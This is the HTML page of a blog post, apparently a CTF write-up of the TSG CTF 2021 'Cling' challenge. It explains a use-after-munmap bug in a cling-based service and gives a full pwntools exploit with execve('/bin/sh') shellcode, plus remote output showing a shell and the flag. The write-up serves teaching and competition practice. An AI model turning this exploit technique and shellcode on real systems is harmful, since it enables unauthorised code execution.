@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>TSG CTF 2021 - Cling | kileak</title>
+
+
+
+
+
+<meta name="description" content="TSG CTF 2021 - Cling">
+
+
+<meta name="keywords" content="tsg, cling">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2021/tsg-cling/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">TSG CTF 2021 - Cling</h1>
+      <p class="post-meta">Oct 4, 2021</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>Cling
+<!--break--></p>
+
+  <p>Description</p>
+
+  <p>I’m happy to announce that our new map-reduce service is now
+running on the rigid and flexible platform.</p>
+
+  <p>nc 34.146.101.4 30003</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/tsg21/cling/cling.tar.gz">cling.tar.gz</a> <a href="https://kileak.github.io/assets/tsg21/cling/xpl.py">xpl.py</a></p>
+
+  <p>Team: Super Guesser</p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">---------------
+1. create
+2. protect
+3. delete
+4. set_map
+5. run_map
+6. set_reduce
+7. run_reduce
+8. show_result
+---------------
+&gt; </code></pre></figure>
+
+<p>This challenge was using <code class="language-plaintext highlighter-rouge">cling</code>, which is an “interactive C++ Interpreter”. We were provided the source of the code, that will be passed to the interpreter.</p>
+
+<p>Options 6-8 were not implemented, so let’s take a quick look at the other options.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">create</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">n_create</span> <span class="o">&gt;</span> <span class="n">N_CREATE</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"too many creation"</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"size? &gt;"</span><span class="p">);</span>
+    <span class="kt">unsigned</span> <span class="n">size</span> <span class="o">=</span> <span class="n">get_num</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="mi">0</span> <span class="o">==</span> <span class="n">size</span> <span class="o">||</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mh">0x1000</span><span class="o">/</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span><span class="p">)))</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"too big"</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">n_create</span><span class="o">++</span><span class="p">;</span>
+    <span class="n">buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x1000</span> <span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">n_elem</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">((</span><span class="kt">long</span> <span class="kt">long</span> <span class="kt">int</span><span class="p">)</span><span class="n">buf</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"fail"</span><span class="p">);</span>
+        <span class="n">n_elem</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">buf</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n_elem</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">scanf</span><span class="p">(</span><span class="s">"%llu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Create will just pretty much <code class="language-plaintext highlighter-rouge">mmap</code> a region with <code class="language-plaintext highlighter-rouge">read/write</code> permissions and stores a pointer to it in a global <code class="language-plaintext highlighter-rouge">buf</code> variable.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">protect</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">u64</span> <span class="n">prot</span> <span class="o">=</span> <span class="n">PROT_NONE</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"read? &gt;"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">get_yes_no</span><span class="p">())</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"yes read"</span><span class="p">);</span>
+        <span class="n">prot</span> <span class="o">|=</span> <span class="n">PROT_READ</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"write? &gt;"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">get_yes_no</span><span class="p">())</span> <span class="p">{</span>
+        <span class="n">prot</span> <span class="o">|=</span> <span class="n">PROT_WRITE</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"exec? &gt;"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">get_yes_no</span><span class="p">())</span> <span class="p">{</span>
+        <span class="n">prot</span> <span class="o">|=</span> <span class="n">PROT_EXEC</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">mprotect</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">prot</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"fail"</span><span class="p">);</span>
+        <span class="n">n_elem</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">buf</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span></code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">protect</code> lets us define the permissions on the mmapped region. Answering all questions with yes will mark it as <code class="language-plaintext highlighter-rouge">rwx</code>.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">del</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">munmap</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"fail"</span><span class="p">);</span>
+        <span class="n">n_elem</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">buf</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span></code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">del</code> will <code class="language-plaintext highlighter-rouge">munmap</code> our current region, without clearing the global <code class="language-plaintext highlighter-rouge">buf</code> pointer. So the address from this will still be available. Normally, this would not be of much use, since that memory region becomes unmapped. But let’s keep this in mind.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">set_map</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">expr</span><span class="p">[</span><span class="mi">8192</span><span class="p">];</span>
+    <span class="kt">char</span> <span class="n">func</span><span class="p">[</span><span class="mi">8492</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">func_set</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Give me your map function body &gt; "</span><span class="p">);</span>
+        <span class="n">scanf</span><span class="p">(</span><span class="s">"%8191s"</span><span class="p">,</span> <span class="n">expr</span><span class="p">);</span>
+        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">strlen</span><span class="p">(</span><span class="n">expr</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">expr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'x'</span> <span class="o">||</span>
+                    <span class="p">(</span><span class="sc">'0'</span> <span class="o">&lt;=</span> <span class="n">expr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="n">expr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="sc">'9'</span><span class="p">)</span> <span class="o">||</span>
+                    <span class="n">expr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">' '</span> <span class="o">||</span>
+                    <span class="n">expr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'+'</span> <span class="o">||</span>
+                    <span class="n">expr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'-'</span> <span class="o">||</span>
+                    <span class="n">expr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'*'</span> <span class="o">||</span>
+                    <span class="n">expr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'/'</span> <span class="o">||</span>
+                    <span class="n">expr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'?'</span> <span class="o">||</span>
+                    <span class="n">expr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">':'</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
+            <span class="n">puts</span><span class="p">(</span><span class="s">"wrong format"</span><span class="p">);</span>
+            <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">sprintf</span><span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="s">"unsigned long map_func(unsigned long x) {return %s;}"</span><span class="p">,</span> <span class="n">expr</span><span class="p">);</span>
+        <span class="n">gCling</span><span class="o">-&gt;</span><span class="n">process</span><span class="p">(</span><span class="n">func</span><span class="p">);</span>
+
+        <span class="n">cling</span><span class="o">::</span><span class="n">Value</span> <span class="n">v</span><span class="p">;</span>
+        <span class="k">auto</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">gCling</span><span class="o">-&gt;</span><span class="n">evaluate</span><span class="p">(</span><span class="s">"map_func(42)"</span><span class="p">,</span> <span class="n">v</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"map_func(42) = %llu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">v</span><span class="p">.</span><span class="n">getULL</span><span class="p">());</span>
+            <span class="n">func_set</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"the map function has already been registered."</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>With <code class="language-plaintext highlighter-rouge">set_map</code> things get interesting. This will let us enter a <code class="language-plaintext highlighter-rouge">map</code> function, which will then be <code class="language-plaintext highlighter-rouge">evaluated</code> by the interpreter.</p>
+
+<p>For this <code class="language-plaintext highlighter-rouge">cling</code> will kinda do a jit compilation, creating a mmapped region, put the code for this function on it and execute it (marking the region as <code class="language-plaintext highlighter-rouge">r-x</code>).</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">run_map</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">expr</span><span class="p">[</span><span class="mh">0x2000</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">func_set</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">cling</span><span class="o">::</span><span class="n">Value</span> <span class="n">v</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">buf</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">||</span> <span class="n">n_elem</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
+        <span class="k">for</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n_elem</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">sprintf</span><span class="p">(</span><span class="n">expr</span><span class="p">,</span> <span class="s">"map_func(%lluULL)"</span><span class="p">,</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+            <span class="n">gCling</span><span class="o">-&gt;</span><span class="n">evaluate</span><span class="p">(</span><span class="n">expr</span><span class="p">,</span> <span class="n">v</span><span class="p">);</span>
+            <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">result</span> <span class="o">=</span> <span class="n">v</span><span class="p">.</span><span class="n">getULL</span><span class="p">();</span>
+            <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"no map function has been registered yet."</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span></code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">run_map</code> will now just take some user input and pass it to the <code class="language-plaintext highlighter-rouge">map</code> function, we defined in <code class="language-plaintext highlighter-rouge">set_map</code>.</p>
+
+<p>So, let’s recap this:</p>
+
+<ul>
+  <li>We can create a mmapped region via <code class="language-plaintext highlighter-rouge">create</code></li>
+  <li>We can set the permissions for this region via <code class="language-plaintext highlighter-rouge">protect</code></li>
+  <li>We can unmap that region (but keep a pointer to it) via <code class="language-plaintext highlighter-rouge">del</code></li>
+  <li>We can create a custom function, which will mmap a region and put code to it via <code class="language-plaintext highlighter-rouge">set_map</code></li>
+  <li>We can execute this custom function (executing the code from the mmapped region) via <code class="language-plaintext highlighter-rouge">run_map</code></li>
+  <li>Also mmapping a region, unmapping and mmapping it again will serve the same region</li>
+</ul>
+
+<p>See, where this is going? :)</p>
+
+<p>If not, the trick is just to <code class="language-plaintext highlighter-rouge">create</code> a mmapped region, fill it up with random values and <code class="language-plaintext highlighter-rouge">munmap</code> it. This region will now be gone, but we’ll still have its address in <code class="language-plaintext highlighter-rouge">buf</code>.</p>
+
+<p>Now we can call <code class="language-plaintext highlighter-rouge">set_map</code> and define a mapping function. Again, it’s content isn’t important, just put something in it, which will compile. This will <code class="language-plaintext highlighter-rouge">mmap</code> again a region, put the code for the map function in it and executes it once (and since we created and unmapped a region before, this code will be put into the exact same region which we have in our <code class="language-plaintext highlighter-rouge">buf</code>).</p>
+
+<p>Because the region from <code class="language-plaintext highlighter-rouge">buf</code> is now mapped again, we can… delete it again… (the map function from <code class="language-plaintext highlighter-rouge">set_map</code> will also now point to the same unmapped region).</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"34.146.101.4"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">30003</span>
+
+
+<span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">vals</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+
+    <span class="k">for</span> <span class="n">val</span> <span class="ow">in</span> <span class="n">vals</span><span class="p">:</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">val</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">setprot</span><span class="p">(</span><span class="n">rd</span><span class="p">,</span> <span class="n">wr</span><span class="p">,</span> <span class="n">exe</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="s">"y"</span> <span class="k">if</span> <span class="n">rd</span> <span class="k">else</span> <span class="s">"n"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="s">"y"</span> <span class="k">if</span> <span class="n">wr</span> <span class="k">else</span> <span class="s">"n"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="s">"y"</span> <span class="k">if</span> <span class="n">exe</span> <span class="k">else</span> <span class="s">"n"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">setmap</span><span class="p">(</span><span class="n">func</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"4"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="n">func</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">" = "</span><span class="p">)</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">resp</span>
+
+
+<span class="k">def</span> <span class="nf">delete</span><span class="p">():</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+
+    <span class="n">size</span> <span class="o">=</span> <span class="mi">1000</span><span class="o">/</span><span class="mi">8</span>
+
+    <span class="n">create</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="p">[</span><span class="s">"+"</span><span class="p">])</span>    <span class="c1"># create a mmapped region
+</span>    <span class="n">delete</span><span class="p">()</span>               <span class="c1"># free it
+</span>    <span class="n">setmap</span><span class="p">(</span><span class="s">"x"</span><span class="p">)</span>            <span class="c1"># create map function (will be created in the just freed region)
+</span>    <span class="n">delete</span><span class="p">()</span>               <span class="c1"># free the map function region (via buf from create)
+</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+    <span class="k">return</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">False</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"chall.c"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+
+        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s">"./cling/bin/cling"</span><span class="p">,</span> <span class="s">"--nologo"</span><span class="p">])</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">util</span><span class="p">.</span><span class="n">proc</span><span class="p">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
+        <span class="n">pause</span><span class="p">()</span>
+
+    <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></figure>
+
+<p>So, let’s just <code class="language-plaintext highlighter-rouge">create</code> again. This will now again serve us the same region as the first <code class="language-plaintext highlighter-rouge">create</code>, which is also the same region the <code class="language-plaintext highlighter-rouge">map</code> function is pointing to :)</p>
+
+<p>We can now just write proper shellcode to it and then execute the <code class="language-plaintext highlighter-rouge">map</code> function via <code class="language-plaintext highlighter-rouge">run_map</code>. Since the <code class="language-plaintext highlighter-rouge">map</code> function is also pointing to the region, we just defined in <code class="language-plaintext highlighter-rouge">create</code> this will then execute our shellcode instead of the previous map function.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">map</code> function will jump to <code class="language-plaintext highlighter-rouge">region + 0xa0</code>, so we just have to append some dummy values in the beginning and then write our shellcode to offset <code class="language-plaintext highlighter-rouge">0xa0</code> in the region</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="p">...</span>
+
+    <span class="c1"># put shellcode on freed page (compiled map function pointing there)
+</span>    <span class="n">SC</span> <span class="o">=</span> <span class="s">"""
+        xor rax, rax
+        mov al, 59
+        mov rdi, rdx
+        add rdi, 0x28
+        xor rsi, rsi
+        xor rdx, rdx
+        syscall
+    """</span>
+
+    <span class="n">l</span> <span class="o">=</span> <span class="p">[]</span>
+
+    <span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">"amd64"</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">SC</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">40</span><span class="p">,</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xa0</span><span class="o">/</span><span class="mi">8</span><span class="p">):</span>
+        <span class="n">l</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span>
+        <span class="n">l</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="p">))))</span>
+
+    <span class="n">create</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">l</span><span class="p">),</span> <span class="n">l</span><span class="p">)</span>
+    <span class="n">setprot</span><span class="p">(</span><span class="bp">True</span><span class="p">,</span> <span class="bp">True</span><span class="p">,</span> <span class="bp">True</span><span class="p">)</span>         <span class="c1"># make our region rwx
+</span>
+    <span class="c1"># execute run_map
+</span>    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"5"</span><span class="p">)</span></code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">run_map</code> will now jump right into our shellcode giving us a shell</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[+] Opening connection to 34.146.101.4 on port 30003: Done
+[*] Switching to interactive mode
+$ ls home/user
+chall.c
+flag-26dec3e0f05adecded30266312a10975
+start.sh
+$ cat /home/user/flag-26dec3e0f05adecded30266312a10975
+TSGCTF{Have_you_ever_solved_Use_After_Munmap_chal?}</code></pre></figure>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=TSG CTF 2021 - Cling&amp;url=https://kileak.github.io/ctf/2021/tsg-cling/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2021/tsg-cling/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
